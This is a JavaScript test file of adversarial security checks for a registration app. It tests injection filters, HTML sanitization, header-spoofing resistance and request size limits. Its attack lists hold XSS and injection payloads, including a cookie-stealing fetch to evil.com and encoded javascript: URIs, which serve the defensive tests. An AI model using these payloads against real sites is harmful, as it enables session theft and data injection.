import test from 'node:test';
import assert from 'node:assert/strict';
import {
  isValidUUID,
  readRawBody,
  safeEqual,
  isSafeLookupQuery,
} from '../lib/security.ts';
import { escapeHtml, sanitizeCertificateHtml } from '../lib/sanitize.ts';
import { createSafeTeamOverview } from '../lib/ticket-presentation.ts';
import { createRegistrationClaim, getRegistrationClaim, hashRegistrationClaim, registrationFingerprint } from '../lib/registration-claim.ts';
import { getClientIP } from '../lib/ratelimit.ts';

test('adversarial: PostgREST operator injection bypass attempts', () => {
  const attacks = [
    'student@srmap.edu.in,id.neq.0',
    'lead_email.ilike.%',
    'id.is.null',
    'id.not.is.null',
    'status.in.(confirmed,pending)',
    'form_data->>phone.eq.9999999999',
    'admin@srmap.edu.in) or (id.is.not.null',
    'user@srmap.edu.in::text',
    'test<test>test',
    'test:test',
    'test,test',
    'test(test)',
    'test;select * from users;',
    'AP12345.eq.AP12345',
    'test.cs.{1,2,3}',
    'test.ov.[1,2]',
  ];

  for (const attack of attacks) {
    assert.equal(
      isSafeLookupQuery(attack),
      false,
      `Attacker query bypassed injection filter: ${attack}`
    );
  }
});

test('adversarial: valid lookup queries pass without false positives', () => {
  const legit = [
    'john.doe@srmap.edu.in',
    'ap21110010001',
    'AP21110010001',
    'student_name@srmap.edu.in',
    'user-name@srmap.edu.in',
    'AP 21110010001',
    'REG-2026-9901',
  ];

  for (const query of legit) {
    assert.equal(
      isSafeLookupQuery(query),
      true,
      `Legitimate query was falsely rejected: ${query}`
    );
  }
});

test('adversarial: XSS mutation payloads and URI bypass attempts', () => {
  const attacks = [
    '<script src="https://evil.com/x.js"></script>',
    '<SCRIPT SRC="https://evil.com/x.js"></SCRIPT>',
    '<img src="x" onerror="fetch(\'https://evil.com/\'+document.cookie)">',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">Click here</a>',
    '<a href="  javascript:alert(1)  ">Click here</a>',
    '<a href="vbscript:msgbox(1)">Click</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>',
    '<body onload="alert(1)">',
    '<svg onload="alert(document.domain)">',
    '<button onclick="malicious()">Submit</button>',
    '<input type="text" onfocus="steal()">',
    '<object data="exploit.swf"></object>',
    '<embed src="exploit.pdf">',
  ];

  for (const attack of attacks) {
    const sanitized = sanitizeCertificateHtml(attack);
    assert.equal(
      /<script\b|onerror|onload|onclick|onfocus|<iframe\b|<object\b|<embed\b|<input\b|<button\b|javascript:|vbscript:|data:text\/html/i.test(
        sanitized
      ),
      false,
      `Sanitization failed to strip payload: ${attack} -> ${sanitized}`
    );
  }
});

test('adversarial: encoded URI, SVG, data URI, and CSS attacks do not survive certificate sanitization', () => {
  const attacks = [
    '<a href="jav&#x61;script:alert(1)">encoded</a>',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">encoded</a>',
    '<img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;">',
    '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
    '<div style="background:url(javascript:alert(1))">x</div>',
    '<p><img src=x onerror=alert(1)><script>alert(1)</script></p>',
  ];
  for (const attack of attacks) {
    const sanitized = sanitizeCertificateHtml(attack);
    assert.doesNotMatch(sanitized, /javascript:|data:|onerror|onload|<svg|<script|url\s*\(/i, sanitized);
  }
});

test('adversarial: a team pass projection cannot disclose sibling QR tokens or PII', () => {
  const overview = createSafeTeamOverview('reg-1', [
    { fullName: 'Alice', email: 'alice@example.test', regNum: 'A1', hash_payload: 'token-a', checked_in: true },
    { fullName: 'Bob', email: 'bob@example.test', hash_payload: 'token-b', branch: 'CSE' },
  ]);
  assert.deepEqual(overview, [
    { id: 'reg-1-m-0', fullName: 'Alice', role: 'Lead' },
    { id: 'reg-1-m-1', fullName: 'Bob', role: 'Member' },
  ]);
  assert.equal(JSON.stringify(overview).includes('token-'), false);
  assert.equal(JSON.stringify(overview).includes('@example'), false);
});

test('adversarial: registration claim and fingerprint bind retries to a single browser/request', () => {
  const claim = createRegistrationClaim();
  assert.match(claim, /^[A-Za-z0-9_-]{40,}$/);
  assert.notEqual(hashRegistrationClaim(claim), hashRegistrationClaim(createRegistrationClaim()));
  assert.equal(getRegistrationClaim(new Request('https://example.test', { headers: { cookie: `msc_registration_claim=${claim}` } })), claim);
  const original = registrationFingerprint({ event_id: 'event-a', email: 'a@example.test', form: { name: 'A', x: 1 } });
  assert.equal(original, registrationFingerprint({ form: { x: 1, name: 'A' }, email: 'a@example.test', event_id: 'event-a' }));
  assert.notEqual(original, registrationFingerprint({ event_id: 'event-b', email: 'a@example.test', form: { name: 'A', x: 1 } }));
});

test('adversarial: production IP extraction ignores spoofed forwarding headers', () => {
  const oldEnv = process.env.NODE_ENV;
  const oldProxy = process.env.TRUSTED_PROXY_MODE;
  process.env.NODE_ENV = 'production';
  delete process.env.TRUSTED_PROXY_MODE;
  assert.equal(getClientIP(new Headers({ 'x-forwarded-for': '203.0.113.77', 'x-real-ip': '203.0.113.78' })), 'unknown');
  process.env.TRUSTED_PROXY_MODE = 'cloudflare';
  assert.equal(getClientIP(new Headers({ 'x-forwarded-for': '203.0.113.77', 'cf-connecting-ip': '198.51.100.10' })), '198.51.100.10');
  if (oldEnv === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = oldEnv;
  if (oldProxy === undefined) delete process.env.TRUSTED_PROXY_MODE; else process.env.TRUSTED_PROXY_MODE = oldProxy;
});

test('adversarial: HTML entity escape handles non-string and nested characters', () => {
  assert.equal(escapeHtml('<b onmouseover="alert(1)">Test</b>'), '&lt;b onmouseover=&quot;alert(1)&quot;&gt;Test&lt;/b&gt;');
  assert.equal(escapeHtml('"""\'\'\'<<<>>>&&&'), '&quot;&quot;&quot;&#39;&#39;&#39;&lt;&lt;&lt;&gt;&gt;&gt;&amp;&amp;&amp;');
  assert.equal(escapeHtml(0), '0');
  assert.equal(escapeHtml(false), 'false');
  assert.equal(escapeHtml(undefined), '');
});

test('adversarial: Bearer token UUID enforcement rejects path traversal & wildcards', () => {
  const malformed = [
    '../ticket/secret',
    '550e8400-e29b-41d4-a716-446655440000/details',
    '550e8400-e29b-41d4-a716-446655440000%00',
    '550e8400-e29b-41d4-a716-44665544000g', // non-hex
    '550e8400-e29b-41d4-a716-4466554400001', // too long
    '550e8400-e29b-41d4-a716-44665544000', // too short
    '*',
    '%',
    '-- OR 1=1',
  ];

  for (const id of malformed) {
    assert.equal(isValidUUID(id), false, `Malformed ID passed UUID check: ${id}`);
  }

  assert.equal(isValidUUID('deca203b-171a-4df9-98bb-d92df29a4e37'), true);
});

test('adversarial: Timing-safe equality defends against length leak and early return', () => {
  const secret = 'a'.repeat(64);
  assert.equal(safeEqual(secret, secret), true);
  assert.equal(safeEqual(secret, 'b'.repeat(64)), false);
  assert.equal(safeEqual(secret, 'a'.repeat(63)), false);
  assert.equal(safeEqual(secret, 'a'.repeat(65)), false);
  assert.equal(safeEqual('', ''), true);
  assert.equal(safeEqual('', 'a'), false);
});

test('adversarial: Streaming byte-counter aborts oversized chunked stream even without Content-Length', async () => {
  const maxLimit = 1024; // 1KB test limit
  let bytesReceived = 0;
  const limiter = new TransformStream({
    transform(chunk, controller) {
      bytesReceived += chunk.byteLength;
      if (bytesReceived > maxLimit) {
        controller.error(new Error('PAYLOAD_TOO_LARGE'));
        return;
      }
      controller.enqueue(chunk);
    },
  });

  // Create stream yielding chunks beyond maxLimit
  const sourceStream = new ReadableStream({
    start(controller) {
      controller.enqueue(new Uint8Array(512));
      controller.enqueue(new Uint8Array(512));
      controller.enqueue(new Uint8Array(512)); // breaches 1KB limit
      controller.close();
    },
  });

  const limited = sourceStream.pipeThrough(limiter);
  const reader = limited.getReader();

  let caughtError = null;
  try {
    while (true) {
      const { done } = await reader.read();
      if (done) break;
    }
  } catch (err) {
    caughtError = err;
  }

  assert.ok(caughtError !== null, 'Stream should have thrown PAYLOAD_TOO_LARGE');
  assert.equal(caughtError.message, 'PAYLOAD_TOO_LARGE');
  assert.ok(bytesReceived > maxLimit);
});

test('adversarial: raw body reader aborts an oversized chunked request before buffering it', async () => {
  const request = new Request('https://example.test', {
    method: 'POST',
    body: new ReadableStream({
      start(controller) {
        controller.enqueue(new Uint8Array(700));
        controller.enqueue(new Uint8Array(700));
        controller.close();
      },
    }),
    duplex: 'half',
  });
  await assert.rejects(() => readRawBody(request, 1024), { name: 'PayloadTooLargeError' });
});
